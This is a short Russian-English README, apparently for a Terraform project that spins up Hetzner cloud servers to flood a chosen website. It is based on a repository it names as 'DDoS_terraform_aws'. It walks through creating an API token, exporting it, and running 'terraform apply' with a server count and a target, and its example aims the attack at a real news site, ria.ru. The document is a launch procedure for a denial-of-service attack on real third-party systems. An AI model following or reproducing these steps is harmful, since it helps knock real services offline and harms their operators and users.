### 1. Регистрация на hetzner (Hetzner registration)
https://www.hetzner.com/cloud
### 2. Создание проекта (Create project)
https://console.hetzner.cloud/projects
### 3. Создание API токена (Create API token)
https://console.hetzner.cloud/projects/\<project number\>/security/tokens (Read + Write)
### 4. Экспорт токена (Export token)
`export TF_VAR_hcloud_token=<ваш токен>`
### 5. Установка Terraform (v1+) (Terraform install)
https://learn.hashicorp.com/tutorials/terraform/install-cli
### 6. Запускаем (Launching)
```terraform
terraform init
terraform apply -auto-approve -var="kozak_count=<кол-во серверов/server count>" -var="target=<цель/target>"
# например (for instance)
terraform apply -auto-approve -var="kozak_count=2" -var="target=https://ria.ru"
```
### 7. Останавливаем (Stopping)
```terraform
terraform destroy -auto-approve
```
---
based on https://github.com/UA-TECH-POWER/DDoS_terraform_aws